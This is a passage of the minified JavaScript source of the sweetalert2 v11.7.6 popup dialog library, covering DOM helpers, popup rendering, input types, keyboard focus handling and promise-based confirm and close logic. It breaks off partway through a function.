/*!
 * sweetalert2 v11.7.6
 * Released under the MIT License.
 */
! function(e, t) {
    "object" == typeof exports && "undefined" != typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define(t) : (e = "undefined" != typeof globalThis ? globalThis : e || self).Sweetalert2 = t()
}(this, (function() {
    "use strict";
    const e = {},
        t = t => new Promise((n => {
            if (!t) return n();
            const o = window.scrollX,
                i = window.scrollY;
            e.restoreFocusTimeout = setTimeout((() => {
                e.previousActiveElement instanceof HTMLElement ? (e.previousActiveElement.focus(), e.previousActiveElement = null) : document.body && document.body.focus(), n()
            }), 100), window.scrollTo(o, i)
        }));
    var n = {
        promise: new WeakMap,
        innerParams: new WeakMap,
        domCache: new WeakMap
    };
    const o = e => {
            const t = {};
            for (const n in e) t[e[n]] = "swal2-" + e[n];
            return t
        },
        i = o(["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "no-transition", "toast", "toast-shown", "show", "hide", "close", "title", "html-container", "actions", "confirm", "deny", "cancel", "default-outline", "footer", "icon", "icon-content", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "input-label", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loader", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl", "timer-progress-bar", "timer-progress-bar-container", "scrollbar-measure", "icon-success", "icon-warning", "icon-info", "icon-question", "icon-error"]),
        s = o(["success", "warning", "info", "question", "error"]),
        r = "SweetAlert2:",
        a = e => e.charAt(0).toUpperCase() + e.slice(1),
        l = e => {
            console.warn(`${r} ${"object"==typeof e?e.join(" "):e}`)
        },
        c = e => {
            console.error(`${r} ${e}`)
        },
        u = [],
        d = (e, t) => {
            var n;
            n = `"${e}" is deprecated and will be removed in the next major release. Please use "${t}" instead.`, u.includes(n) || (u.push(n), l(n))
        },
        p = e => "function" == typeof e ? e() : e,
        m = e => e && "function" == typeof e.toPromise,
        g = e => m(e) ? e.toPromise() : Promise.resolve(e),
        h = e => e && Promise.resolve(e) === e,
        f = () => document.body.querySelector(`.${i.container}`),
        b = e => {
            const t = f();
            return t ? t.querySelector(e) : null
        },
        y = e => b(`.${e}`),
        w = () => y(i.popup),
        v = () => y(i.icon),
        C = () => y(i.title),
        A = () => y(i["html-container"]),
        k = () => y(i.image),
        B = () => y(i["progress-steps"]),
        P = () => y(i["validation-message"]),
        x = () => b(`.${i.actions} .${i.confirm}`),
        E = () => b(`.${i.actions} .${i.cancel}`),
        $ = () => b(`.${i.actions} .${i.deny}`),
        T = () => b(`.${i.loader}`),
        L = () => y(i.actions),
        S = () => y(i.footer),
        O = () => y(i["timer-progress-bar"]),
        M = () => y(i.close),
        j = () => {
            const e = Array.from(w().querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])')).sort(((e, t) => {
                    const n = parseInt(e.getAttribute("tabindex")),
                        o = parseInt(t.getAttribute("tabindex"));
                    return n > o ? 1 : n < o ? -1 : 0
                })),
                t = Array.from(w().querySelectorAll('\n  a[href],\n  area[href],\n  input:not([disabled]),\n  select:not([disabled]),\n  textarea:not([disabled]),\n  button:not([disabled]),\n  iframe,\n  object,\n  embed,\n  [tabindex="0"],\n  [contenteditable],\n  audio[controls],\n  video[controls],\n  summary\n')).filter((e => "-1" !== e.getAttribute("tabindex")));
            return (e => {
                const t = [];
                for (let n = 0; n < e.length; n++) - 1 === t.indexOf(e[n]) && t.push(e[n]);
                return t
            })(e.concat(t)).filter((e => G(e)))
        },
        I = () => V(document.body, i.shown) && !V(document.body, i["toast-shown"]) && !V(document.body, i["no-backdrop"]),
        H = () => w() && V(w(), i.toast),
        D = {
            previousBodyPadding: null
        },
        q = (e, t) => {
            if (e.textContent = "", t) {
                const n = (new DOMParser).parseFromString(t, "text/html");
                Array.from(n.querySelector("head").childNodes).forEach((t => {
                    e.appendChild(t)
                })), Array.from(n.querySelector("body").childNodes).forEach((t => {
                    t instanceof HTMLVideoElement || t instanceof HTMLAudioElement ? e.appendChild(t.cloneNode(!0)) : e.appendChild(t)
                }))
            }
        },
        V = (e, t) => {
            if (!t) return !1;
            const n = t.split(/\s+/);
            for (let t = 0; t < n.length; t++)
                if (!e.classList.contains(n[t])) return !1;
            return !0
        },
        N = (e, t, n) => {
            if (((e, t) => {
                    Array.from(e.classList).forEach((n => {
                        Object.values(i).includes(n) || Object.values(s).includes(n) || Object.values(t.showClass).includes(n) || e.classList.remove(n)
                    }))
                })(e, t), t.customClass && t.customClass[n]) {
                if ("string" != typeof t.customClass[n] && !t.customClass[n].forEach) return void l(`Invalid type of customClass.${n}! Expected string or iterable object, got "${typeof t.customClass[n]}"`);
                U(e, t.customClass[n])
            }
        },
        F = (e, t) => {
            if (!t) return null;
            switch (t) {
                case "select":
                case "textarea":
                case "file":
                    return e.querySelector(`.${i.popup} > .${i[t]}`);
                case "checkbox":
                    return e.querySelector(`.${i.popup} > .${i.checkbox} input`);
                case "radio":
                    return e.querySelector(`.${i.popup} > .${i.radio} input:checked`) || e.querySelector(`.${i.popup} > .${i.radio} input:first-child`);
                case "range":
                    return e.querySelector(`.${i.popup} > .${i.range} input`);
                default:
                    return e.querySelector(`.${i.popup} > .${i.input}`)
            }
        },
        _ = e => {
            if (e.focus(), "file" !== e.type) {
                const t = e.value;
                e.value = "", e.value = t
            }
        },
        R = (e, t, n) => {
            e && t && ("string" == typeof t && (t = t.split(/\s+/).filter(Boolean)), t.forEach((t => {
                Array.isArray(e) ? e.forEach((e => {
                    n ? e.classList.add(t) : e.classList.remove(t)
                })) : n ? e.classList.add(t) : e.classList.remove(t)
            })))
        },
        U = (e, t) => {
            R(e, t, !0)
        },
        z = (e, t) => {
            R(e, t, !1)
        },
        W = (e, t) => {
            const n = Array.from(e.children);
            for (let e = 0; e < n.length; e++) {
                const o = n[e];
                if (o instanceof HTMLElement && V(o, t)) return o
            }
        },
        K = (e, t, n) => {
            n === `${parseInt(n)}` && (n = parseInt(n)), n || 0 === parseInt(n) ? e.style[t] = "number" == typeof n ? `${n}px` : n : e.style.removeProperty(t)
        },
        Y = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "flex";
            e.style.display = t
        },
        Z = e => {
            e.style.display = "none"
        },
        J = (e, t, n, o) => {
            const i = e.querySelector(t);
            i && (i.style[n] = o)
        },
        X = function(e, t) {
            t ? Y(e, arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "flex") : Z(e)
        },
        G = e => !(!e || !(e.offsetWidth || e.offsetHeight || e.getClientRects().length)),
        Q = e => !!(e.scrollHeight > e.clientHeight),
        ee = e => {
            const t = window.getComputedStyle(e),
                n = parseFloat(t.getPropertyValue("animation-duration") || "0"),
                o = parseFloat(t.getPropertyValue("transition-duration") || "0");
            return n > 0 || o > 0
        },
        te = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
            const n = O();
            G(n) && (t && (n.style.transition = "none", n.style.width = "100%"), setTimeout((() => {
                n.style.transition = `width ${e/1e3}s linear`, n.style.width = "0%"
            }), 10))
        },
        ne = () => "undefined" == typeof window || "undefined" == typeof document,
        oe = `\n <div aria-labelledby="${i.title}" aria-describedby="${i["html-container"]}" class="${i.popup}" tabindex="-1">\n   <button type="button" class="${i.close}"></button>\n   <ul class="${i["progress-steps"]}"></ul>\n   <div class="${i.icon}"></div>\n   <img class="${i.image}" />\n   <h2 class="${i.title}" id="${i.title}"></h2>\n   <div class="${i["html-container"]}" id="${i["html-container"]}"></div>\n   <input class="${i.input}" />\n   <input type="file" class="${i.file}" />\n   <div class="${i.range}">\n     <input type="range" />\n     <output></output>\n   </div>\n   <select class="${i.select}"></select>\n   <div class="${i.radio}"></div>\n   <label for="${i.checkbox}" class="${i.checkbox}">\n     <input type="checkbox" />\n     <span class="${i.label}"></span>\n   </label>\n   <textarea class="${i.textarea}"></textarea>\n   <div class="${i["validation-message"]}" id="${i["validation-message"]}"></div>\n   <div class="${i.actions}">\n     <div class="${i.loader}"></div>\n     <button type="button" class="${i.confirm}"></button>\n     <button type="button" class="${i.deny}"></button>\n     <button type="button" class="${i.cancel}"></button>\n   </div>\n   <div class="${i.footer}"></div>\n   <div class="${i["timer-progress-bar-container"]}">\n     <div class="${i["timer-progress-bar"]}"></div>\n   </div>\n </div>\n`.replace(/(^|\n)\s*/g, ""),
        ie = () => {
            e.currentInstance.resetValidationMessage()
        },
        se = e => {
            const t = (() => {
                const e = f();
                return !!e && (e.remove(), z([document.documentElement, document.body], [i["no-backdrop"], i["toast-shown"], i["has-column"]]), !0)
            })();
            if (ne()) return void c("SweetAlert2 requires document to initialize");
            const n = document.createElement("div");
            n.className = i.container, t && U(n, i["no-transition"]), q(n, oe);
            const o = "string" == typeof(s = e.target) ? document.querySelector(s) : s;
            var s;
            o.appendChild(n), (e => {
                const t = w();
                t.setAttribute("role", e.toast ? "alert" : "dialog"), t.setAttribute("aria-live", e.toast ? "polite" : "assertive"), e.toast || t.setAttribute("aria-modal", "true")
            })(e), (e => {
                "rtl" === window.getComputedStyle(e).direction && U(f(), i.rtl)
            })(o), (() => {
                const e = w(),
                    t = W(e, i.input),
                    n = W(e, i.file),
                    o = e.querySelector(`.${i.range} input`),
                    s = e.querySelector(`.${i.range} output`),
                    r = W(e, i.select),
                    a = e.querySelector(`.${i.checkbox} input`),
                    l = W(e, i.textarea);
                t.oninput = ie, n.onchange = ie, r.onchange = ie, a.onchange = ie, l.oninput = ie, o.oninput = () => {
                    ie(), s.value = o.value
                }, o.onchange = () => {
                    ie(), s.value = o.value
                }
            })()
        },
        re = (e, t) => {
            e instanceof HTMLElement ? t.appendChild(e) : "object" == typeof e ? ae(e, t) : e && q(t, e)
        },
        ae = (e, t) => {
            e.jquery ? le(t, e) : q(t, e.toString())
        },
        le = (e, t) => {
            if (e.textContent = "", 0 in t)
                for (let n = 0; n in t; n++) e.appendChild(t[n].cloneNode(!0));
            else e.appendChild(t.cloneNode(!0))
        },
        ce = (() => {
            if (ne()) return !1;
            const e = document.createElement("div"),
                t = {
                    WebkitAnimation: "webkitAnimationEnd",
                    animation: "animationend"
                };
            for (const n in t)
                if (Object.prototype.hasOwnProperty.call(t, n) && void 0 !== e.style[n]) return t[n];
            return !1
        })(),
        ue = (e, t) => {
            const n = L(),
                o = T();
            t.showConfirmButton || t.showDenyButton || t.showCancelButton ? Y(n) : Z(n), N(n, t, "actions"),
                function(e, t, n) {
                    const o = x(),
                        s = $(),
                        r = E();
                    de(o, "confirm", n), de(s, "deny", n), de(r, "cancel", n),
                        function(e, t, n, o) {
                            if (!o.buttonsStyling) return void z([e, t, n], i.styled);
                            U([e, t, n], i.styled), o.confirmButtonColor && (e.style.backgroundColor = o.confirmButtonColor, U(e, i["default-outline"]));
                            o.denyButtonColor && (t.style.backgroundColor = o.denyButtonColor, U(t, i["default-outline"]));
                            o.cancelButtonColor && (n.style.backgroundColor = o.cancelButtonColor, U(n, i["default-outline"]))
                        }(o, s, r, n), n.reverseButtons && (n.toast ? (e.insertBefore(r, o), e.insertBefore(s, o)) : (e.insertBefore(r, t), e.insertBefore(s, t), e.insertBefore(o, t)))
                }(n, o, t), q(o, t.loaderHtml), N(o, t, "loader")
        };

    function de(e, t, n) {
        X(e, n[`show${a(t)}Button`], "inline-block"), q(e, n[`${t}ButtonText`]), e.setAttribute("aria-label", n[`${t}ButtonAriaLabel`]), e.className = i[t], N(e, n, `${t}Button`), U(e, n[`${t}ButtonClass`])
    }
    const pe = (e, t) => {
        const n = f();
        n && (! function(e, t) {
            "string" == typeof t ? e.style.background = t : t || U([document.documentElement, document.body], i["no-backdrop"])
        }(n, t.backdrop), function(e, t) {
            t in i ? U(e, i[t]) : (l('The "position" parameter is not valid, defaulting to "center"'), U(e, i.center))
        }(n, t.position), function(e, t) {
            if (t && "string" == typeof t) {
                const n = `grow-${t}`;
                n in i && U(e, i[n])
            }
        }(n, t.grow), N(n, t, "container"))
    };
    const me = ["input", "file", "range", "select", "radio", "checkbox", "textarea"],
        ge = e => {
            if (!Ce[e.input]) return void c(`Unexpected type of input! Expected "text", "email", "password", "number", "tel", "select", "radio", "checkbox", "textarea", "file" or "url", got "${e.input}"`);
            const t = we(e.input),
                n = Ce[e.input](t, e);
            Y(t), e.inputAutoFocus && setTimeout((() => {
                _(n)
            }))
        },
        he = (e, t) => {
            const n = F(w(), e);
            if (n) {
                (e => {
                    for (let t = 0; t < e.attributes.length; t++) {
                        const n = e.attributes[t].name;
                        ["type", "value", "style"].includes(n) || e.removeAttribute(n)
                    }
                })(n);
                for (const e in t) n.setAttribute(e, t[e])
            }
        },
        fe = e => {
            const t = we(e.input);
            "object" == typeof e.customClass && U(t, e.customClass.input)
        },
        be = (e, t) => {
            e.placeholder && !t.inputPlaceholder || (e.placeholder = t.inputPlaceholder)
        },
        ye = (e, t, n) => {
            if (n.inputLabel) {
                e.id = i.input;
                const o = document.createElement("label"),
                    s = i["input-label"];
                o.setAttribute("for", e.id), o.className = s, "object" == typeof n.customClass && U(o, n.customClass.inputLabel), o.innerText = n.inputLabel, t.insertAdjacentElement("beforebegin", o)
            }
        },
        we = e => W(w(), i[e] || i.input),
        ve = (e, t) => {
            ["string", "number"].includes(typeof t) ? e.value = `${t}` : h(t) || l(`Unexpected type of inputValue! Expected "string", "number" or "Promise", got "${typeof t}"`)
        },
        Ce = {};
    Ce.text = Ce.email = Ce.password = Ce.number = Ce.tel = Ce.url = (e, t) => (ve(e, t.inputValue), ye(e, e, t), be(e, t), e.type = t.input, e), Ce.file = (e, t) => (ye(e, e, t), be(e, t), e), Ce.range = (e, t) => {
        const n = e.querySelector("input"),
            o = e.querySelector("output");
        return ve(n, t.inputValue), n.type = t.input, ve(o, t.inputValue), ye(n, e, t), e
    }, Ce.select = (e, t) => {
        if (e.textContent = "", t.inputPlaceholder) {
            const n = document.createElement("option");
            q(n, t.inputPlaceholder), n.value = "", n.disabled = !0, n.selected = !0, e.appendChild(n)
        }
        return ye(e, e, t), e
    }, Ce.radio = e => (e.textContent = "", e), Ce.checkbox = (e, t) => {
        const n = F(w(), "checkbox");
        n.value = "1", n.id = i.checkbox, n.checked = Boolean(t.inputValue);
        const o = e.querySelector("span");
        return q(o, t.inputPlaceholder), n
    }, Ce.textarea = (e, t) => {
        ve(e, t.inputValue), be(e, t), ye(e, e, t);
        return setTimeout((() => {
            if ("MutationObserver" in window) {
                const t = parseInt(window.getComputedStyle(w()).width);
                new MutationObserver((() => {
                    const n = e.offsetWidth + (o = e, parseInt(window.getComputedStyle(o).marginLeft) + parseInt(window.getComputedStyle(o).marginRight));
                    var o;
                    w().style.width = n > t ? `${n}px` : null
                })).observe(e, {
                    attributes: !0,
                    attributeFilter: ["style"]
                })
            }
        })), e
    };
    const Ae = (e, t) => {
            const o = A();
            N(o, t, "htmlContainer"), t.html ? (re(t.html, o), Y(o, "block")) : t.text ? (o.textContent = t.text, Y(o, "block")) : Z(o), ((e, t) => {
                const o = w(),
                    s = n.innerParams.get(e),
                    r = !s || t.input !== s.input;
                me.forEach((e => {
                    const n = W(o, i[e]);
                    he(e, t.inputAttributes), n.className = i[e], r && Z(n)
                })), t.input && (r && ge(t), fe(t))
            })(e, t)
        },
        ke = (e, t) => {
            for (const n in s) t.icon !== n && z(e, s[n]);
            U(e, s[t.icon]), xe(e, t), Be(), N(e, t, "icon")
        },
        Be = () => {
            const e = w(),
                t = window.getComputedStyle(e).getPropertyValue("background-color"),
                n = e.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
            for (let e = 0; e < n.length; e++) n[e].style.backgroundColor = t
        },
        Pe = (e, t) => {
            let n, o = e.innerHTML;
            if (t.iconHtml) n = Ee(t.iconHtml);
            else if ("success" === t.icon) n = '\n  <div class="swal2-success-circular-line-left"></div>\n  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>\n  <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>\n  <div class="swal2-success-circular-line-right"></div>\n', o = o.replace(/ style=".*?"/g, "");
            else if ("error" === t.icon) n = '\n  <span class="swal2-x-mark">\n    <span class="swal2-x-mark-line-left"></span>\n    <span class="swal2-x-mark-line-right"></span>\n  </span>\n';
            else {
                n = Ee({
                    question: "?",
                    warning: "!",
                    info: "i"
                } [t.icon])
            }
            o.trim() !== n.trim() && q(e, n)
        },
        xe = (e, t) => {
            if (t.iconColor) {
                e.style.color = t.iconColor, e.style.borderColor = t.iconColor;
                for (const n of [".swal2-success-line-tip", ".swal2-success-line-long", ".swal2-x-mark-line-left", ".swal2-x-mark-line-right"]) J(e, n, "backgroundColor", t.iconColor);
                J(e, ".swal2-success-ring", "borderColor", t.iconColor)
            }
        },
        Ee = e => `<div class="${i["icon-content"]}">${e}</div>`,
        $e = (e, t) => {
            e.className = `${i.popup} ${G(e)?t.showClass.popup:""}`, t.toast ? (U([document.documentElement, document.body], i["toast-shown"]), U(e, i.toast)) : U(e, i.modal), N(e, t, "popup"), "string" == typeof t.customClass && U(e, t.customClass), t.icon && U(e, i[`icon-${t.icon}`])
        },
        Te = e => {
            const t = document.createElement("li");
            return U(t, i["progress-step"]), q(t, e), t
        },
        Le = e => {
            const t = document.createElement("li");
            return U(t, i["progress-step-line"]), e.progressStepsDistance && K(t, "width", e.progressStepsDistance), t
        },
        Se = (e, t) => {
            ((e, t) => {
                const n = f(),
                    o = w();
                t.toast ? (K(n, "width", t.width), o.style.width = "100%", o.insertBefore(T(), v())) : K(o, "width", t.width), K(o, "padding", t.padding), t.color && (o.style.color = t.color), t.background && (o.style.background = t.background), Z(P()), $e(o, t)
            })(0, t), pe(0, t), ((e, t) => {
                const n = B();
                t.progressSteps && 0 !== t.progressSteps.length ? (Y(n), n.textContent = "", t.currentProgressStep >= t.progressSteps.length && l("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)"), t.progressSteps.forEach(((e, o) => {
                    const s = Te(e);
                    if (n.appendChild(s), o === t.currentProgressStep && U(s, i["active-progress-step"]), o !== t.progressSteps.length - 1) {
                        const e = Le(t);
                        n.appendChild(e)
                    }
                }))) : Z(n)
            })(0, t), ((e, t) => {
                const o = n.innerParams.get(e),
                    i = v();
                if (o && t.icon === o.icon) return Pe(i, t), void ke(i, t);
                if (t.icon || t.iconHtml) {
                    if (t.icon && -1 === Object.keys(s).indexOf(t.icon)) return c(`Unknown icon! Expected "success", "error", "warning", "info" or "question", got "${t.icon}"`), void Z(i);
                    Y(i), Pe(i, t), ke(i, t), U(i, t.showClass.icon)
                } else Z(i)
            })(e, t), ((e, t) => {
                const n = k();
                t.imageUrl ? (Y(n, ""), n.setAttribute("src", t.imageUrl), n.setAttribute("alt", t.imageAlt), K(n, "width", t.imageWidth), K(n, "height", t.imageHeight), n.className = i.image, N(n, t, "image")) : Z(n)
            })(0, t), ((e, t) => {
                const n = C();
                X(n, t.title || t.titleText, "block"), t.title && re(t.title, n), t.titleText && (n.innerText = t.titleText), N(n, t, "title")
            })(0, t), ((e, t) => {
                const n = M();
                q(n, t.closeButtonHtml), N(n, t, "closeButton"), X(n, t.showCloseButton), n.setAttribute("aria-label", t.closeButtonAriaLabel)
            })(0, t), Ae(e, t), ue(0, t), ((e, t) => {
                const n = S();
                X(n, t.footer), t.footer && re(t.footer, n), N(n, t, "footer")
            })(0, t), "function" == typeof t.didRender && t.didRender(w())
        },
        Oe = () => x() && x().click(),
        Me = Object.freeze({
            cancel: "cancel",
            backdrop: "backdrop",
            close: "close",
            esc: "esc",
            timer: "timer"
        }),
        je = e => {
            e.keydownTarget && e.keydownHandlerAdded && (e.keydownTarget.removeEventListener("keydown", e.keydownHandler, {
                capture: e.keydownListenerCapture
            }), e.keydownHandlerAdded = !1)
        },
        Ie = (e, t) => {
            const n = j();
            if (n.length) return (e += t) === n.length ? e = 0 : -1 === e && (e = n.length - 1), void n[e].focus();
            w().focus()
        },
        He = ["ArrowRight", "ArrowDown"],
        De = ["ArrowLeft", "ArrowUp"],
        qe = (e, t, o) => {
            const i = n.innerParams.get(e);
            i && (t.isComposing || 229 === t.keyCode || (i.stopKeydownPropagation && t.stopPropagation(), "Enter" === t.key ? Ve(e, t, i) : "Tab" === t.key ? Ne(t) : [...He, ...De].includes(t.key) ? Fe(t.key) : "Escape" === t.key && _e(t, i, o)))
        },
        Ve = (e, t, n) => {
            if (p(n.allowEnterKey) && t.target && e.getInput() && t.target instanceof HTMLElement && t.target.outerHTML === e.getInput().outerHTML) {
                if (["textarea", "file"].includes(n.input)) return;
                Oe(), t.preventDefault()
            }
        },
        Ne = e => {
            const t = e.target,
                n = j();
            let o = -1;
            for (let e = 0; e < n.length; e++)
                if (t === n[e]) {
                    o = e;
                    break
                } e.shiftKey ? Ie(o, -1) : Ie(o, 1), e.stopPropagation(), e.preventDefault()
        },
        Fe = e => {
            const t = [x(), $(), E()];
            if (document.activeElement instanceof HTMLElement && !t.includes(document.activeElement)) return;
            const n = He.includes(e) ? "nextElementSibling" : "previousElementSibling";
            let o = document.activeElement;
            for (let e = 0; e < L().children.length; e++) {
                if (o = o[n], !o) return;
                if (o instanceof HTMLButtonElement && G(o)) break
            }
            o instanceof HTMLButtonElement && o.focus()
        },
        _e = (e, t, n) => {
            p(t.allowEscapeKey) && (e.preventDefault(), n(Me.esc))
        };
    var Re = {
        swalPromiseResolve: new WeakMap,
        swalPromiseReject: new WeakMap
    };
    const Ue = () => {
            Array.from(document.body.children).forEach((e => {
                e.hasAttribute("data-previous-aria-hidden") ? (e.setAttribute("aria-hidden", e.getAttribute("data-previous-aria-hidden")), e.removeAttribute("data-previous-aria-hidden")) : e.removeAttribute("aria-hidden")
            }))
        },
        ze = () => {
            const e = navigator.userAgent,
                t = !!e.match(/iPad/i) || !!e.match(/iPhone/i),
                n = !!e.match(/WebKit/i);
            if (t && n && !e.match(/CriOS/i)) {
                const e = 44;
                w().scrollHeight > window.innerHeight - e && (f().style.paddingBottom = `${e}px`)
            }
        },
        We = () => {
            const e = f();
            let t;
            e.ontouchstart = e => {
                t = Ke(e)
            }, e.ontouchmove = e => {
                t && (e.preventDefault(), e.stopPropagation())
            }
        },
        Ke = e => {
            const t = e.target,
                n = f();
            return !Ye(e) && !Ze(e) && (t === n || !Q(n) && t instanceof HTMLElement && "INPUT" !== t.tagName && "TEXTAREA" !== t.tagName && (!Q(A()) || !A().contains(t)))
        },
        Ye = e => e.touches && e.touches.length && "stylus" === e.touches[0].touchType,
        Ze = e => e.touches && e.touches.length > 1,
        Je = () => {
            null === D.previousBodyPadding && document.body.scrollHeight > window.innerHeight && (D.previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right")), document.body.style.paddingRight = `${D.previousBodyPadding+(()=>{const e=document.createElement("div");e.className=i["scrollbar-measure"],document.body.appendChild(e);const t=e.getBoundingClientRect().width-e.clientWidth;return document.body.removeChild(e),t})()}px`)
        };

    function Xe(n, o, s, r) {
        H() ? st(n, r) : (t(s).then((() => st(n, r))), je(e));
        /^((?!chrome|android).)*safari/i.test(navigator.userAgent) ? (o.setAttribute("style", "display:none !important"), o.removeAttribute("class"), o.innerHTML = "") : o.remove(), I() && (null !== D.previousBodyPadding && (document.body.style.paddingRight = `${D.previousBodyPadding}px`, D.previousBodyPadding = null), (() => {
            if (V(document.body, i.iosfix)) {
                const e = parseInt(document.body.style.top, 10);
                z(document.body, i.iosfix), document.body.style.top = "", document.body.scrollTop = -1 * e
            }
        })(), Ue()), z([document.documentElement, document.body], [i.shown, i["height-auto"], i["no-backdrop"], i["toast-shown"]])
    }

    function Ge(e) {
        e = nt(e);
        const t = Re.swalPromiseResolve.get(this),
            n = Qe(this);
        this.isAwaitingPromise ? e.isDismissed || (tt(this), t(e)) : n && t(e)
    }
    const Qe = e => {
        const t = w();
        if (!t) return !1;
        const o = n.innerParams.get(e);
        if (!o || V(t, o.hideClass.popup)) return !1;
        z(t, o.showClass.popup), U(t, o.hideClass.popup);
        const i = f();
        return z(i, o.showClass.backdrop), U(i, o.hideClass.backdrop), ot(e, t, o), !0
    };

    function et(e) {
        const t = Re.swalPromiseReject.get(this);
        tt(this), t && t(e)
    }
    const tt = e => {
            e.isAwaitingPromise && (delete e.isAwaitingPromise, n.innerParams.get(e) || e._destroy())
        },
        nt = e => void 0 === e ? {
            isConfirmed: !1,
            isDenied: !1,
            isDismissed: !0
        } : Object.assign({
            isConfirmed: !1,
            isDenied: !1,
            isDismissed: !1
        }, e),
        ot = (e, t, n) => {
            const o = f(),
                i = ce && ee(t);
            "function" == typeof n.willClose && n.willClose(t), i ? it(e, t, o, n.returnFocus, n.didClose) : Xe(e, o, n.returnFocus, n.didClose)
        },
        it = (t, n, o, i, s) => {
            e.swalCloseEventFinishedCallback = Xe.bind(null, t, o, i, s), n.addEventListener(ce, (function(t) {
                t.target === n && (e.swalCloseEventFinishedCallback(), delete e.swalCloseEventFinishedCallback)
            }))
        },
        st = (e, t) => {
            setTimeout((() => {
                "function" == typeof t && t.bind(e.params)(), e._destroy && e._destroy()
            }))
        },
        rt = e => {
            let t = w();
            t || new Dn, t = w();
            const n = T();
            H() ? Z(v()) : at(t, e), Y(n), t.setAttribute("data-loading", "true"), t.setAttribute("aria-busy", "true"), t.focus()
        },
        at = (e, t) => {
            const n = L(),
                o = T();
            !t && G(x()) && (t = x()), Y(n), t && (Z(t), o.setAttribute("data-button-to-replace", t.className)), o.parentNode.insertBefore(o, t), U([e, n], i.loading)
        },
        lt = e => e.checked ? 1 : 0,
        ct = e => e.checked ? e.value : null,
        ut = e => e.files.length ? null !== e.getAttribute("multiple") ? e.files : e.files[0] : null,
        dt = (e, t) => {
            const n = w(),
                o = e => {
                    mt[t.input](n, gt(e), t)
                };
            m(t.inputOptions) || h(t.inputOptions) ? (rt(x()), g(t.inputOptions).then((t => {
                e.hideLoading(), o(t)
            }))) : "object" == typeof t.inputOptions ? o(t.inputOptions) : c("Unexpected type of inputOptions! Expected object, Map or Promise, got " + typeof t.inputOptions)
        },
        pt = (e, t) => {
            const n = e.getInput();
            Z(n), g(t.inputValue).then((o => {
                n.value = "number" === t.input ? `${parseFloat(o)||0}` : `${o}`, Y(n), n.focus(), e.hideLoading()
            })).catch((t => {
                c(`Error in inputValue promise: ${t}`), n.value = "", Y(n), n.focus(), e.hideLoading()
            }))
        },
        mt = {
            select: (e, t, n) => {
                const o = W(e, i.select),
                    s = (e, t, o) => {
                        const i = document.createElement("option");
                        i.value = o, q(i, t), i.selected = ht(o, n.inputValue), e.appendChild(i)
                    };
                t.forEach((e => {
                    const t = e[0],
                        n = e[1];
                    if (Array.isArray(n)) {
                        const e = document.createElement("optgroup");
                        e.label = t, e.disabled = !1, o.appendChild(e), n.forEach((t => s(e, t[1], t[0])))
                    } else s(o, n, t)
                })), o.focus()
            },
            radio: (e, t, n) => {
                const o = W(e, i.radio);
                t.forEach((e => {
                    const t = e[0],
                        s = e[1],
                        r = document.createElement("input"),
                        a = document.createElement("label");
                    r.type = "radio", r.name = i.radio, r.value = t, ht(t, n.inputValue) && (r.checked = !0);
                    const l = document.createElement("span");
                    q(l, s), l.className = i.label, a.appendChild(r), a.appendChild(l), o.appendChild(a)
                }));
                const s = o.querySelectorAll("input");
                s.length && s[0].focus()
            }
        },
        gt = e => {
            const t = [];
            return "undefined" != typeof Map && e instanceof Map ? e.forEach(((e, n) => {
                let o = e;
                "object" == typeof o && (o = gt(o)), t.push([n, o])
            })) : Object.keys(e).forEach((n => {
                let o = e[n];
                "object" == typeof o && (o = gt(o)), t.push([n, o])
            })), t
        },
        ht = (e, t) => t && t.toString() === e.toString(),
        ft = (e, t) => {
            const o = n.innerParams.get(e);
            if (!o.input) return void c(`The "input" parameter is needed to be set when using returnInputValueOn${a(t)}`);
            const i = ((e, t) => {
                const n = e.getInput();
                if (!n) return null;
                switch (t.input) {
                    case "checkbox":
                        return lt(n);
                    case "radio":
                        return ct(n);
                    case "file":
                        return ut(n);
                    default:
                        return t.inputAutoTrim ? n.value.trim() : n.value
                }
            })(e, o);
            o.inputValidator ? bt(e, i, t) : e.getInput().checkValidity() ? "deny" === t ? yt(e, i) : Ct(e, i) : (e.enableButtons(), e.showValidationMessage(o.validationMessage))
        },
        bt = (e, t, o) => {
            const i = n.innerParams.get(e);
            e.disableInput();
            Promise.resolve().then((() => g(i.inputValidator(t, i.validationMessage)))).then((n => {
                e.enableButtons(), e.enableInput(), n ? e.showValidationMessage(n) : "deny" === o ? yt(e, t) : Ct(e, t)
            }))
        },
        yt = (e, t) => {
            const o = n.innerParams.get(e || void 0);
            if (o.showLoaderOnDeny && rt($()), o.preDeny) {
                e.isAwaitingPromise = !0;
                Promise.resolve().then((() => g(o.preDeny(t, o.validationMessage)))).then((n => {
                    !1 === n ? (e.hideLoading(), tt(e)) : e.close({
                        isDenied: !0,
                        value: void 0 === n ? t : n
                    })
                })).catch((t => vt(e || void 0, t)))
            } else e.close({
                isDenied: !0,
                value: t
            })
        },
        wt = (e, t) => {
            e.close({
                isConfirmed: !0,
                value: t
            })
        },
        vt = (e, t) => {
            e.rejectPromise(t)
        },
        Ct = (e, t) => {
            const o = n.innerParams.get(e || void 0);
            if (o.showLoaderOnConfirm && rt(), o.preConfirm) {
                e.resetValidationMessage(), e.isAwaitingPromise = !0;
                Promise.resolve().then((() => g(o.preConfirm(t, o.validationMessage)))).then((n => {
                    G(P()) || !1 === n ? (e.hideLoading(), tt(e)) : wt(e, void 0 === n ? t : n)
                })).catch((t => vt(e || void 0, t)))
            } else wt(e, t)
        };

    function At() {
        const e = n.innerParams.get(this);
        if (!e) return;
        const t = n.domCache.get(this);
